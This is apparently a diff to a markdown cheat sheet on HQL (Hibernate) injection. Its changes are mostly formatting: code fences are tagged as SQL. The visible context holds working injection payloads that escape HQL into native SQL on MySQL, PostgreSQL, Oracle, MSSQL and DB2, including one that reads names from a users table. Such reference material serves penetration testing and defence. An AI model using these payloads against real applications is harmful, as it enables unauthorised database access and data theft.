@@ -19,9 +19,8 @@
 
 ## HQL Comments
 
-```sql
-HQL does not support comments
-```
+HQL does not support comments.
+
 
 ## HQL List Columns
 
@@ -58,17 +57,19 @@ select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.pro
 
 :warning: **HQL does not support UNION queries**
 
+
 ## Single Quote Escaping
 
 Method works for MySQL DBMS which escapes SINGLE QUOTES in strings with SLASH `\'`.
 
 In HQL SINGLE QUOTES is escaped in strings by doubling `''`.
 
-```
+```sql
 'abc\''or 1=(select 1)--'
 ```
 
 In HQL it is a string, in MySQL it is a string and additional SQL expression.
+
 
 ## $-quoted strings
 
@@ -76,9 +77,10 @@ Method works for DBMS which allow DOLLAR-QUOTED strings in SQL expressions: Post
 
 Hibernate ORM allows identifiers starting with `$$`.
 
-```
+```sql
 $$='$$=concat(chr(61),chr(39)) and 1=1--'
 ```
+
 
 ## DBMS Magic functions
 
@@ -88,13 +90,13 @@ Hibernate allows to specify any function name in HQL expression.
 
 PostgreSQL has built-in function `query_to_xml('Arbitrary SQL')`.
 
-```
+```sql
 array_upper(xpath('row',query_to_xml('select 1 where 1337>1', true, false,'')),1)
 ```
 
 Oracle has built-in function `DBMS_XMLGEN.getxml('SQL')`
 
-```
+```sql
 NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1'
 ```
 
@@ -106,7 +108,7 @@ In Microsoft SQL SERVER `SELECT LEN([U+00A0](select[U+00A0](1))` works the same 
 
 HQL allows UNICODE symbols in identifiers (function or parameter names).
 
-```
+```sql
 SELECT p FROM hqli.persistent.Post p where p.name='dummy' or 1<LEN( (select top 1 name from users)) or '1'='11'
 ```
 
@@ -146,7 +148,7 @@ com.sun.java.help.impl.DocPConst.QUOTE                   [ JavaHelp ]
 org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE  [ EclipseHelp ]
 ```
 
-```
+```sql
 dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
 ```
 
